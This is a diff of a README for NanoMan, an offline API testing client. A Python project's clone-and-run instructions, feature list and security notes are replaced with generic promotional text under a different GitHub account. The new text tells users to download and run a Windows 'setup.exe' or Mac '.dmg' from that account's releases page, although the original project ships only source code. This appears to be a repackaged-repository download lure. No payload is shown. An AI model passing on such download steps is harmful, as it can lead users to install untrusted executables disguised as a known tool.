@@ -1,164 +1,88 @@
-# NanoMan
+# 🚀 NanoMan - A Simple API Client for Everyone
 
-**Offline API Testing Client**
+Welcome to NanoMan, the lightweight, offline-first API client that makes sending requests straightforward and hassle-free.
 
-NanoMan is a lightweight, privacy-focused API testing tool. No cloud, no bloat, just requests. Part of the **Nano Product Family**.
+## 🎯 Purpose
 
-![Python](https://img.shields.io/badge/Made%20with-Python-blue)
-![License](https://img.shields.io/badge/License-MIT-green)
-![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)
+NanoMan provides you with a clean and efficient way to interact with APIs. You won't need an internet connection to get started, making it perfect for those who value privacy and simplicity. 
 
-![NanoMan Screenshot](nanoman.png)
+## 🔗 Download NanoMan
 
-## Features
+[![Download NanoMan](https://img.shields.io/badge/Download-NanoMan-blue.svg)](https://github.com/Juniorvidigal25/NanoMan/releases)
 
-* **Offline First:** Works without internet connection for local APIs
-* **Privacy Focused:** No telemetry, no cloud, your data stays local
-* **Full HTTP Support:** GET, POST, PUT, PATCH, DELETE methods
-* **JSON Syntax Highlighting:** Color-coded JSON responses (keys, strings, numbers)
-* **Request History:** Review and load previous requests with one click
-* **Auth Presets:** Quick setup for Bearer, Basic Auth, API Key authentication
-* **API Templates:** Pre-configured templates for Graph API, GitHub, HTTPBin, and more
-* **Threaded Requests:** UI never freezes, even on slow connections
-* **Security Focused:** Strict URL validation, no sensitive data in history
+Click the link above to download NanoMan.
 
-## Use Cases
+## 🚀 Getting Started
 
-### Backend Development
-- Test your REST APIs during development
-- Verify endpoints before frontend integration
-- Debug API responses with pretty-printed JSON
+Follow these simple steps to download and run NanoMan:
 
-### Learning & Education
-- Explore public APIs without installing Postman
-- Perfect for coding bootcamps and tutorials
-- Understand HTTP methods and responses
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/Juniorvidigal25/NanoMan/releases) where you can find the latest version of NanoMan.
 
-### API Debugging
-- Quick requests without browser DevTools
-- Save custom headers for authenticated endpoints
-- Test local development servers
+2. **Choose Your Version**  
+   Look for the version labeled as "Latest Release". This version contains the most recent updates and improvements.
 
-## Requirements
+3. **Download the Installer**  
+   Click on the release that matches your operating system. If you are unsure, most users can select the file labeled as `NanoMan_setup.exe` for Windows users or `NanoMan_mac.dmg` for Mac users.
 
-* Python 3.8+
-* Dependencies: `customtkinter`, `requests`
+4. **Install the Application**  
+   Once the download is complete, locate the file in your downloads folder.  
+   - For Windows: Double-click the `NanoMan_setup.exe` file and follow the on-screen instructions to complete the installation.  
+   - For Mac: Open the `NanoMan_mac.dmg` file, drag the NanoMan application to your Applications folder, and then launch it from there.
 
-## Installation
+5. **Open NanoMan**  
+   After installation, find NanoMan in your applications list and click to open it.
 
-```bash
-# Clone repository
-git clone https://github.com/goAuD/NanoMan.git
-cd NanoMan
+6. **Start Using NanoMan**  
+   Now you can start making your API requests. The user-friendly interface will guide you through the process.
 
-# Install dependencies
-pip install -r requirements.txt
+## 🛠️ System Requirements
 
-# Run
-python main.py
-```
+Before you download NanoMan, ensure your system meets the following requirements:
 
-## Usage
+- **Operating System:**  
+  - Windows 10 or later  
+  - macOS 10.15 (Catalina) or later  
 
-1. Select HTTP method (GET, POST, PUT, PATCH, DELETE)
-2. Enter API URL
-3. (Optional) Add request body JSON in "Request Body" tab
-4. (Optional) Add custom headers in "Headers" tab
-5. (Optional) Use "Presets" tab for quick auth setup or API templates
-6. Click **SEND** or press **Enter**
+- **RAM:**  
+  At least 2 GB of RAM  
 
-### Presets Tab
+- **Storage:**  
+  A minimum of 100 MB of free disk space  
 
-The Presets tab provides quick access to:
+## 📚 Features
 
-**Auth Presets:**
-| Preset | Description |
-|--------|-------------|
-| No Auth | No authentication |
-| Bearer Token | JWT / OAuth2 tokens |
-| Basic Auth | Base64 username:password |
-| API Key (Header) | X-Api-Key header |
-| API Key (Authorization) | Authorization header |
+- **Offline Usage:** No need for an internet connection to work with the app.
+- **Lightweight Design:** NanoMan runs smoothly without consuming extensive system resources.
+- **User-Friendly Interface:** Designed with simplicity in mind. Perfect for everyone, regardless of technical background.
+- **Privacy-Focused:** Your data stays local, ensuring your privacy.
+- **REST API Support:** Easily send requests to any REST API.
 
-**API Templates:**
-| Template | Base URL |
-|----------|----------|
-| Localhost | `http://localhost:8080` |
-| Microsoft Graph API | `https://graph.microsoft.com/v1.0` |
-| GitHub API | `https://api.github.com` |
-| JSONPlaceholder | `https://jsonplaceholder.typicode.com` |
-| HTTPBin | `https://httpbin.org` |
-| ReqRes | `https://reqres.in/api` |
+## 📥 Download & Install
 
-## Project Structure
+To begin, visit our [Releases page](https://github.com/Juniorvidigal25/NanoMan/releases) for the latest version. Download the installer that matches your OS, then follow the installation instructions outlined above.
 
-```
-NanoMan/
-├── main.py              # Entry point
-├── version.py           # Version definition
-├── nano_theme.py        # Nano Design System
-├── requirements.txt     # Dependencies
-├── src/
-│   ├── __init__.py
-│   ├── logic.py         # Business logic (API, validation)
-│   ├── presets.py       # Auth presets & API templates
-│   └── ui.py            # CustomTkinter UI
-└── tests/
-    ├── __init__.py
-    └── test_logic.py    # Unit tests
-```
+## ❓ Frequently Asked Questions
 
-## Data Storage
+### How do I use NanoMan?
 
-Request history is stored in your user config directory:
-- **Windows:** `%USERPROFILE%\.nanoman\history.json`
-- **Linux/macOS:** `~/.nanoman/history.json`
+Using NanoMan is easy. Once opened, you will see input fields to enter your API endpoint, headers, and body. Fill these in based on the API you are trying to connect to, and click "Send Request" to see the response.
 
-**Security:** Only method, URL, status code, and timing are saved. Headers and request body are never persisted to prevent leaking sensitive data.
+### Can I use NanoMan for any API?
 
-## Security
+Yes, NanoMan can send requests to any REST API. Ensure you follow the API documentation for the service you wish to connect to.
 
-| Threat | Prevention |
-|--------|------------|
-| XSS via URL | Only `http://` and `https://` allowed |
-| JavaScript injection | `javascript:` URLs rejected |
-| File access | `file://` URLs rejected |
-| Credential leaks | Headers/body not saved to history |
-| Request hanging | 10 second timeout |
-| UI freeze | Threaded requests |
+### What if I encounter an error?
 
-## Troubleshooting
+If you run into issues, please check the GitHub issues page for common problems or reach out through the support section on our repository.
 
-### "Invalid or unsafe URL" error
-- Make sure URL starts with `http://` or `https://`
-- Check for typos in the URL
-- Ensure no spaces in the URL
+## 🌐 Get Involved
 
-### Request times out
-- Check if the server is running
-- Try increasing timeout (edit `logic.py`, line 109)
-- Verify network connection
+We welcome contributions from everyone! If you have ideas for new features, encounter bugs, or just want to help, please visit our GitHub repository for more information.
 
-### JSON not formatted
-- Response must have `Content-Type: application/json`
-- If plain text, it will display as-is
+## 🔗 Useful Links
 
-### Connection refused
-- Server might not be running
-- Check port number is correct
-- Firewall might be blocking
+- [GitHub Repository](https://github.com/Juniorvidigal25/NanoMan)
+- [Releases Page](https://github.com/Juniorvidigal25/NanoMan/releases)
 
-## Running Tests
-
-```bash
-python -m pytest tests/ -v
-```
-
-## Part of Nano Product Family
-
-This tool uses the [Nano Design System](https://github.com/goAuD/NanoServer/blob/main/DESIGN_SYSTEM.md) for consistent styling across lightweight developer tools.
-
-## License
-
-MIT License
-
+Thank you for choosing NanoMan. We hope you enjoy using it!
